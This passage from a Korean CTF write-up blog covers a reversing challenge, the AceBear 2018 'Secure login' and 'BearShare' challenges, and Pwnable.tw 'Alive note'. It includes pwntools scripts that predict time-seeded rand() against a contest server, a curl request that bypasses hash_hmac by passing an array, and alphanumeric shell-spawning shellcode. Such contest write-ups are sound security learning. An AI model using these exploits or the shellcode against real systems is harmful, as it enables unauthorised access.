        <h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><p>Password를 입력받아 검사후 결과를 출력해주는 간단한 프로그램이다. 먼저 IDA를 통해 Password 검사 루틴을 분석하였다. 검사를 진행하는 함수는 hex-ray가 작동하지 않아서 어셈블리를 통해 분석해야했다.<br><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:01391573                 mov     edx, dword_1395408</span><br><span class="line">.text:01391579</span><br><span class="line">.text:01391579 loc_1391579:                            ; CODE XREF: sub_1391480+E0</span><br><span class="line">.text:01391579                 inc     esi</span><br><span class="line">.text:0139157A                 cmp     esi, dword_1395428</span><br><span class="line">.text:01391580                 jl      short loc_1391533</span><br><span class="line">.text:01391582                 pop     edi</span><br><span class="line">.text:01391583</span><br><span class="line">.text:01391583 loc_1391583:                            ; CODE XREF: sub_1391480+B0</span><br><span class="line">.text:01391583                 pop     esi</span><br><span class="line">.text:01391584                 test    edx, edx</span><br><span class="line">.text:01391586                 jz      short loc_13915AE</span><br><span class="line">.text:01391588                 mov     ecx, [edx+4]</span><br><span class="line">.text:0139158B                 call    sub_1391090</span><br><span class="line">.text:01391590                 mov     ecx, [edx+8]</span><br><span class="line">.text:01391593                 call    sub_1391090</span><br></pre></td></tr></table></figure></p>
<p>입력받은 Password를 tree 형태로 만드는데, Password의 첫 번째 글자가 최상위 노드가 되고, 두 번째 글자부터는 부모 노드와 값을 비교하여 작으면 왼쪽 노드가 되고, 크면 오른쪽 노드가 된다. 결국 꽤 복잡한 구조로 트리화되고 왼쪽 최하위 노드부터 하나씩 꺼내와서 Password를 다시 만든다. 그렇게 만들어진 Password를 다시 원래대로 돌리는것은 매우 힘들어보였다.<br><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:013915AE                 mov     eax, Tree_password</span><br><span class="line">.text:013915B3                 mov     ecx, Tree_password+4</span><br><span class="line">.text:013915B9                 xor     eax, ecx</span><br><span class="line">.text:013915BB                 cmp     eax, 4</span><br><span class="line">.text:013915BE                 jnz     short fail</span><br><span class="line">.text:013915C0                 mov     eax, Tree_password+8</span><br><span class="line">.text:013915C5                 xor     eax, ecx</span><br><span class="line">.text:013915C7                 cmp     eax, 7</span><br><span class="line">.text:013915CA                 jnz     short fail</span><br><span class="line">.text:013915CC                 mov     eax, Tree_password+0Ch</span><br><span class="line">.text:013915D1                 xor     eax, Tree_password+10h</span><br><span class="line">.text:013915D7                 cmp     eax, 8</span><br><span class="line">.text:013915DA                 jnz     short fail</span><br><span class="line">.text:013915DC                 mov     eax, Tree_password+14h</span><br><span class="line">.text:013915E1                 xor     eax, Tree_password+18h</span><br><span class="line">.text:013915E7                 cmp     eax, 50h</span><br></pre></td></tr></table></figure></p>
<p>재정렬된 Password를 하나씩 가져와 xor 연산으로 검사하는데, 재정렬되는 규칙이 입력 값에 따라서 매우 변칙적이라 이 정보만으로는 원래의 패스워드를 알아내기 힘들다. <br><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( (Tree_password[i] ^ Table[Tree_password[i]]) == *((_BYTE *)&amp;v6 + i) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ++i &gt;= len )</span><br><span class="line">    <span class="keyword">goto</span> correct;</span><br><span class="line">&#125;</span><br><span class="line">print((<span class="keyword">int</span>)<span class="string">"Noob\n"</span>, v4);</span><br></pre></td></tr></table></figure></p>
<p>xor 연산말고 다른 함수에서 Password의 검사를 2번 진행하는데, 첫번째 함수의 검사는 위와 같다. 이 함수 덕분에 재정렬된 Password를 어느 정도 알아낼 수 있다. 예를 들어 재정렬된 Password의 첫 번째 글자가 ‘a’라고 하면 Table[‘a’] ^ v6[0]이 ‘a’가 되어야하므로 조건에 만족하는 문자를 전부 구한다음 xor 연산까지 만족하는 문자를 찾으면 될 것 같다.<br><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = [<span class="number">0x29</span>,<span class="number">0x2D</span>, ... ,<span class="number">0x67</span>,<span class="number">0x6A</span>]</span><br><span class="line">v6 = [<span class="number">0xF6</span>,<span class="number">0xE7</span>,<span class="number">0xE3</span>,<span class="number">0xF8</span>,<span class="number">0xDD</span>,<span class="number">0xE3</span>,<span class="number">0x16</span>,<span class="number">0x1D</span>,<span class="number">0xE6</span>,<span class="number">0xEC</span>,<span class="number">0xEC</span>,<span class="number">0xCC</span>,<span class="number">0xE7</span>,<span class="number">0xE0</span>,<span class="number">0xE9</span>,<span class="number">0x07</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">		<span class="keyword">if</span> ord(i)^table[ord(i)] == v6[j]:</span><br><span class="line">			<span class="keyword">print</span> str(j)+<span class="string">' : '</span>+i,</span><br><span class="line"><span class="comment">#output</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0 :  0</span></span><br><span class="line"><span class="string">1 :  4 p</span></span><br><span class="line"><span class="string">2 :  3 5</span></span><br><span class="line"><span class="string">3 :  1</span></span><br><span class="line"><span class="string">4 :  9 v :</span></span><br><span class="line"><span class="string">5 :  3 5</span></span><br><span class="line"><span class="string">6 :  e</span></span><br><span class="line"><span class="string">7 :  g</span></span><br><span class="line"><span class="string">8 :  l</span></span><br><span class="line"><span class="string">9 :  6 k r /</span></span><br><span class="line"><span class="string">10 :  6 k r /</span></span><br><span class="line"><span class="string">11 :  y =</span></span><br><span class="line"><span class="string">12 :  4 p</span></span><br><span class="line"><span class="string">13 :  m</span></span><br><span class="line"><span class="string">14 :  i</span></span><br><span class="line"><span class="string">15 :  a</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
<p>가능한 문자열이 2개 이상인 경우에는 xor 연산도 만족하는 문자를 선택하면 된다. 그러면 몇 글자만 빼고 전부 알아낼 수 있다.<br><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( ((<span class="keyword">unsigned</span> __int8)password[i] ^ LOBYTE(Tree_password[i])) == *((_BYTE *)&amp;v2 + i) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ++i &gt;= <span class="number">16</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Password를 검사하는 2번째 함수에서는 정렬되기 전의 Password를 연산에 사용하므로 재정렬된 Password를 통해 원래의 Password를 알아낼 수 있다. 위에서 구한 패스워드를 전부 xor해보면 flag를 구할 수 있다.<br><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c2 = [<span class="number">0x51</span>,<span class="number">0x01</span>,<span class="number">0x5a</span>,<span class="number">0x5c</span>,<span class="number">0x49</span>,<span class="number">0x04</span>,<span class="number">0x56</span>,<span class="number">0x0c</span>,<span class="number">0x58</span>,<span class="number">0x12</span>,<span class="number">0x1e</span>,<span class="number">0x49</span>,<span class="number">0x17</span>,<span class="number">0x54</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>]</span><br><span class="line">tp = <span class="string">'043195eglkrypmia'</span></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">	password += chr(ord(tp[i]) ^ c2[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> password</span><br><span class="line"><span class="comment">#output - 'a5imp13k4yl0g9er'</span></span><br></pre></td></tr></table></figure></p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/02/02/AceBear-Security-Contest-2018-Secure-login/">AceBear Security Contest 2018 - Secure login</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-02-02T05:39:30.000Z" itemprop="datePublished">
    2018-02-02
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/reversing/">Reversing</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s1 = (<span class="keyword">char</span> *)generate_password((<span class="keyword">int</span>)&amp;password);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Generated password: %s\n"</span>, s1);</span><br><span class="line"> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"Congratulations!"</span>);</span><br><span class="line">   fd = open(<span class="string">"flag"</span>, <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> ( !fd )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"Can not read flag! Please report this bug!"</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>nc에 접속해서 만들어지는 password를 맞추면 flag를 출력해준다. password는 rand() 값을 사용하기 때문에 같은 입력값이라도 실행마다 결과값이 변한다.<br><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)nptr = *(_DWORD *)(<span class="number">4</span> * i + a1);</span><br><span class="line">    *(_DWORD *)v9 = dword_804B0C0[i];</span><br><span class="line">    v1 = strtoul(nptr, (<span class="keyword">char</span> **)nptr + <span class="number">2</span>, <span class="number">16</span>);</span><br><span class="line">    v2 = strtoul(v9, (<span class="keyword">char</span> **)v9 + <span class="number">2</span>, <span class="number">16</span>);</span><br><span class="line">    v3 = rand();</span><br><span class="line">    v6 = (<span class="keyword">unsigned</span> __int16)(v2 * ((v6 ^ v1 ^ v3) + <span class="number">1</span>) + (v6 ^ v1 ^ v3));</span><br><span class="line">    <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)s + <span class="number">4</span> * i, <span class="string">"%04X"</span>, v6);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>위는 password를 생성하는 루틴이다. srand(time(0))와 rand를 이용하여 랜덤한 password를 생성하는 것은 python ctypes 모듈로 rand 값을 알아낼 수 있으므로 v2 값만 알아내면 되는데 v2의 값은 key라는 파일에서 읽어온다. 생성되는 password를 맞추기 위해 먼저 key 파일의 내용을 전부 알아내야 한다.<br><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="keyword">lambda</span> x:hex(x).replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">clib = cdll.LoadLibrary(<span class="string">'/home/kirasys/slibc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">   s = remote(<span class="string">'securelogin.acebear.site'</span>,<span class="number">5001</span>)</span><br><span class="line"></span><br><span class="line">   timestamp = clib.time(<span class="number">0</span>)</span><br><span class="line">   clib.srand(int(timestamp)))</span><br><span class="line"></span><br><span class="line">   s.recvuntil(<span class="string">'Give me your name: '</span>)</span><br><span class="line">   s.sendline(<span class="string">'name'</span>)</span><br><span class="line"></span><br><span class="line">   s.recvuntil(<span class="string">'Gime me your password: '</span>)</span><br><span class="line">   password = <span class="string">''</span></span><br><span class="line">   </span><br><span class="line">   sum = <span class="number">0</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)/<span class="number">4</span> + <span class="number">1</span>):</span><br><span class="line">      v = (clib.rand() ^ sum)&amp;<span class="number">0xffff</span></span><br><span class="line">      password += e(v)</span><br><span class="line">      <span class="keyword">if</span> len(key[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>])==<span class="number">4</span>:</span><br><span class="line">         sum = int(key[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>],<span class="number">16</span>)</span><br><span class="line">         </span><br><span class="line"></span><br><span class="line">   s.sendline(password.ljust(<span class="number">64</span>,<span class="string">'1'</span>))</span><br><span class="line"></span><br><span class="line">   s.recvuntil(<span class="string">'Generated password: '</span>)</span><br><span class="line">   s.recvn(len(key))</span><br><span class="line">   key += s.recvn(<span class="number">4</span>)</span><br><span class="line">   </span><br><span class="line">   s.close()</span><br><span class="line">   <span class="keyword">if</span> len(key)&gt;=<span class="number">64</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> key</span><br></pre></td></tr></table></figure></p>
<p>v2의 값이 key 파일의 데이터이므로, (v6 ^ v1 ^ v3)을 0으로 만들어주면 생성된 password의 4byte가 key 파일의 데이터가 된다. 이런 방식으로 실행마다 4byte씩 알아낼 수 있는데 로컬과 서버의 시간이 안맞을경우 잘못된 key값이 생성될 수도 있기 때문에 여러번 실행하여 같은 결과값이 나올때가 정확한 key라고 할 수 있다.<br><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">key  = <span class="string">'5EDE28F84F7D5C039775B9DFFC1F85673F20C83757934BCD2FBC48868044D193'</span></span><br><span class="line">pw   = <span class="string">'F05664E983F54E5FA6D5D4FFC5BF930743F60D8FC2C78AFBB0AF7C82664F2043'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>/<span class="number">4</span>):</span><br><span class="line">	a = int(key[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>],<span class="number">16</span>)</span><br><span class="line">	b = BitVec(<span class="string">'b'</span>,<span class="number">16</span>)</span><br><span class="line">	</span><br><span class="line">	s = Solver()</span><br><span class="line">	s.add((a+<span class="number">1</span>)*(b+<span class="number">1</span>) == int(pw[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>],<span class="number">16</span>) + <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">if</span> s.check() == unsat:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Error!!!"</span></span><br><span class="line">	m = s.model()</span><br><span class="line">	<span class="keyword">print</span> str(m[b])+<span class="string">','</span>,</span><br></pre></td></tr></table></figure></p>
<p>key 값을 전부 알아냈으면 조건에 맞게 password를 생성해주면 된다. (v6 ^ v1 ^ v3)의 값을 b라고 하고, v2의 값을 a라고 하면 a(b+1) + b = (a+1)(b+1) - 1 의 값을 특정한 값으로 만들어야 한다는 것이다. a는 고정적인 key 값이므로 z3의 BitVec을 이용하여 b의 값이 총 16번 for문을 돌면서 어떤 값이 되어야 하는지 알아낸 뒤, rand 값과 input을 그 값에 맞게 보내면 password를 특정한 값으로 만들 수 있다.<br><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">KEY     = <span class="string">'5EDE28F84F7D5C039775B9DFFC1F85673F20C83757934BCD2FBC48868044D193'</span></span><br><span class="line">gen_pw  = <span class="string">'0000F05664E983F54E5FA6D5D4FFC5BF930743F60D8FC2C78AFBB0AF7C82664F2043'</span></span><br><span class="line">b = [<span class="number">13704</span>, <span class="number">41145</span>, <span class="number">21700</span>, <span class="number">11159</span>, <span class="number">9232</span>, <span class="number">215</span>, <span class="number">1005</span>, <span class="number">6916</span>, <span class="number">38934</span>, <span class="number">7741</span>, <span class="number">8905</span>, <span class="number">8913</span>, <span class="number">58991</span>, <span class="number">14116</span>, <span class="number">64015</span>, <span class="number">7228</span>]</span><br><span class="line"></span><br><span class="line">e = <span class="keyword">lambda</span> x:hex(x).replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">clib = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">   s = remote(<span class="string">'securelogin.acebear.site'</span>,<span class="number">5001</span>)</span><br><span class="line"></span><br><span class="line">   timestamp = clib.time(<span class="number">0</span>)</span><br><span class="line">   clib.srand(int(timestamp))</span><br><span class="line"></span><br><span class="line">   s.recvuntil(<span class="string">'Give me your name: '</span>)</span><br><span class="line">   s.sendline(<span class="string">'name'</span>)</span><br><span class="line"></span><br><span class="line">   s.recvuntil(<span class="string">'Gime me your password: '</span>)</span><br><span class="line">   password = <span class="string">''</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>/<span class="number">4</span>):</span><br><span class="line">      password += e(b[i] ^ (clib.rand()&amp;<span class="number">0xffff</span>) ^ int(gen_pw[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">   s.sendline(password)</span><br><span class="line">   res =  s.recv(<span class="number">1024</span>)</span><br><span class="line">   <span class="keyword">if</span> res.find(<span class="string">'Wrong'</span>)&lt;<span class="number">0</span>:</span><br><span class="line">      s.interactive()</span><br><span class="line">   </span><br><span class="line">   s.close()</span><br></pre></td></tr></table></figure></p>
<p>b의 값을 전부 알아냈으니 그걸 이용하여 패스워드를 생성하여 보내주면 된다.</p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/30/AceBear-Security-Contest-2018-BearShare/">AceBear Security Contest 2018 - BearShare</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-30T11:50:48.000Z" itemprop="datePublished">
    2018-01-30
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/web/">Web</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Create message</span></span><br><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>]))&#123;</span><br><span class="line">        $message = (string)$_POST[<span class="string">'message'</span>];</span><br><span class="line">        $rand_id = rand(<span class="number">1000000000</span>, <span class="number">9999999999</span>).<span class="string">'salt^&amp;#@!'</span>.rand(<span class="number">1000000000</span>, <span class="number">9999999999</span>);</span><br><span class="line">	$messid = md5($rand_id);</span><br><span class="line">	$store_location = rand(<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">if</span>($store_location%<span class="number">2</span>===<span class="number">0</span>)&#123;</span><br><span class="line">		file_put_contents(<span class="string">'/var/www/messagestore/'</span>.$messid,$message);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		file_put_contents(<span class="string">'/var/www/messagestore2/'</span>.$messid,$message);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>robots.txt를 확인하여 웹 페이지의 소스 코드를 얻을 수 있다. 메시지의 id는 랜덤 값의 md5 해쉬가 되고 /var/www/messagestore 에 파일로 저장된다.<br><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Read message</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'messid'</span>]))&#123;</span><br><span class="line">	$messid = $_POST[<span class="string">'messid'</span>];</span><br><span class="line">	validate_hash();</span><br><span class="line">	$url=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($_POST[<span class="string">'storagesv'</span>] === <span class="string">'message1.local'</span> <span class="keyword">or</span> $_POST[<span class="string">'storagesv'</span>] === <span class="string">'message2.local'</span>)&#123;</span><br><span class="line">		$url = <span class="string">'http://'</span>.$_POST[<span class="string">'storagesv'</span>].<span class="string">'/'</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> ($_POST[<span class="string">'storagesv'</span>]===<span class="string">"gimmeflag"</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'AceBear&#123;******&#125;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$messid = filter($messid);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($messid)&#123;	</span><br><span class="line">	  $url .= $messid;</span><br><span class="line">          $out = shell_exec(<span class="string">'/usr/bin/python '</span>.$BROWSER_BOT.<span class="string">' '</span>.escapeshellarg(<span class="string">'http://route.local/?url='</span>.urlencode($url)).<span class="string">' 2&gt;&amp;1'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Hey, are you a haxor?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Javascript</span></span><br><span class="line">$( <span class="string">".ss"</span> ).change(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($(<span class="string">".ss"</span>).val() == <span class="string">"message1.local"</span>)&#123;</span><br><span class="line">		$(<span class="string">"input[name='hash']"</span>).val(<span class="string">"&lt;?php echo gen_hash($nonce, 'message1.local'); ?&gt;"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>($(<span class="string">".ss"</span>).val() == <span class="string">"message2.local"</span>)&#123;</span><br><span class="line">		$(<span class="string">"input[name='hash']"</span>).val(<span class="string">"&lt;?php echo gen_hash($nonce, 'message2.local'); ?&gt;"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="string">"None"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>메시지 저장소를 선택하고 읽어오고 싶은 메시지의 id를 입력하면 해당 메시지를 출력해준다. validate_hash 함수에서 저장소를 검사하며 message1.local, meessage2.local 이외에 저장소를 입력하면 hash 값을 모르기 때문에 검사에서 걸린다. flag는 저장소를 ‘gimmeflag’로 조작하였을 때 출력해준다.<br><br><br></p>
<h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">validate_hash</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">'hash'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'storagesv'</span>]))&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'Cannot verify server'</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'nonce'</span>]))&#123;</span><br><span class="line">           $S_KEY = hash_hmac(<span class="string">'sha256'</span>,$_POST[<span class="string">'nonce'</span>],$S_KEY);</span><br><span class="line">       &#125;</span><br><span class="line">       $final_hash = hash_hmac(<span class="string">'sha256'</span>,$_POST[<span class="string">'storagesv'</span>],$S_KEY);</span><br><span class="line">       <span class="keyword">if</span> ($final_hash !== $_POST[<span class="string">'hash'</span>])&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'Cannot verify server'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>$_POST 변수의 값이 scalar인지 검사하지 않기 때문에, $_POST 변수에 배열을 전달해서 hash_hmac이 정상적으로 작동하지 않게 만들 수 있다. 로컬에서 확인해보았더니 hash_hmac 함수의 두번째 인자에 배열을 전달하면 NULL을 반환한다. 결과적으로 $S_KEY 또는 $final_hash를 NULL로 만들 수 있다. $final_hash를 NULL로 만들어서 if문을 우회할 수 있지만 $_POST[‘storagesv’]의 값을 배열로 전달해야되서 flag를 얻어올 수 없다. $S_KEY를 NULL로 바꾸면 hash_hmac의 key값이 NULL로 된다는 것을 예측할 수 있으므로 로컬에서 hash값을 만들어 if문을 우회할 수 있다. <br><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        $nonce = <span class="keyword">array</span>();</span><br><span class="line">        $S_KEY = hash_hmac(<span class="string">'sha256'</span>,$nonce,<span class="string">'1231231'</span>);</span><br><span class="line">        $a = hash_hmac(<span class="string">'sha256'</span>,<span class="string">'gimmeflag'</span>,$S_KEY);</span><br><span class="line">        var_dump($a);</span><br><span class="line">        var_dump($S_KEY);</span><br><span class="line">?</span><br><span class="line">output:</span><br><span class="line">string(<span class="number">64</span>) <span class="string">"028cf6abf024b107104bc69d844cd3e70755cf2be66b9ab313ca62f9efdcf769"</span></span><br><span class="line"><span class="keyword">NULL</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST --data <span class="string">"nonce[]=1&amp;storagesv=gimmeflag&amp;hash=028cf6abf024b107104bc69d844cd3e70755cf2be66b9ab313ca62f9efdcf769"</span> http://35.198.201.83/download.php</span><br></pre></td></tr></table></figure>
<p>nonce로 배열로 바꾸고 얻은 hash 값을 이용하여 flag을 얻어올 수 있다.</p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/28/Pwnable-tw-Alive-note/">Pwnable.tw - Alive note</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-28T04:11:23.000Z" itemprop="datePublished">
    2018-01-28
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/pwnable/">Pwnable</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> v1;</span><br><span class="line"></span><br><span class="line">v1 = read_int();</span><br><span class="line"><span class="keyword">if</span> ( v1 &gt; <span class="number">10</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Out of bound !!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>v1은 int형이라서 음수로 만들어 원하는 곳에 heap 주소를 write 할 수 있고 nx가 꺼져있어서 8byte의 쉘코드를 실행시킬 수 있다.<br><br><br></p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>8byte 만으로 쉘을 실행시키는 것은 힘들어서 힙 공간에 여러 쉘코드 조각들을 올려놓고 jno를 통해 연속적으로 실행하기로 했다.<br><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:  52                      push   edx</span><br><span class="line">1:  52                      push   edx</span><br><span class="line">2:  52                      push   edx</span><br><span class="line">3:  54                      push   esp</span><br><span class="line">4:  52                      push   edx</span><br><span class="line">5:  52                      push   edx</span><br><span class="line">6:  52                      push   edx</span><br><span class="line">7:  52                      push   edx</span><br><span class="line">8:  61                      popa</span><br><span class="line">9:  59                      pop    ecx</span><br><span class="line">a:  59                      pop    ecx</span><br><span class="line">b:  52                      push   edx</span><br><span class="line">c:  52                      push   edx</span><br><span class="line">d:  52                      push   edx</span><br><span class="line">e:  68 4e 4e 73 68      push   0x68734e4e</span><br><span class="line">13: 58                      pop    eax</span><br><span class="line">14: 66 35 61 61         xor    ax,0x6161</span><br><span class="line">18: 50                      push   eax</span><br><span class="line">19: 68 4e 62 69 6e      push   0x6e69624e</span><br><span class="line">1e: 58                      pop    eax</span><br><span class="line">1f: 34 61                  xor    al,0x61</span><br><span class="line">21: 50                      push   eax</span><br><span class="line">22: 52                      push   edx</span><br><span class="line">23: 52                      push   edx</span><br><span class="line">24: 52                      push   edx</span><br><span class="line">25: 6a 41                  push   0x41</span><br><span class="line">27: 58                      pop    eax</span><br><span class="line">28: 34 4a                  xor    al,0x4a</span><br><span class="line">2a: 5a                      pop    edx</span><br><span class="line">2b: 4a                      dec    edx</span><br><span class="line">2c: 31 51 42            xor    DWORD PTR [ecx+0x42],edx</span><br><span class="line">2f: 6a 4e                   push   0x4e</span><br><span class="line">31: 5a                      pop    edx</span><br><span class="line">32: 31 51 43            xor    DWORD PTR [ecx+0x43],edx</span><br><span class="line">35: 5a                      pop    edx</span><br><span class="line">36: 59                      pop    ecx</span><br><span class="line">37: 32 31               xor    dh,BYTE PTR [ecx]</span><br></pre></td></tr></table></figure></p>
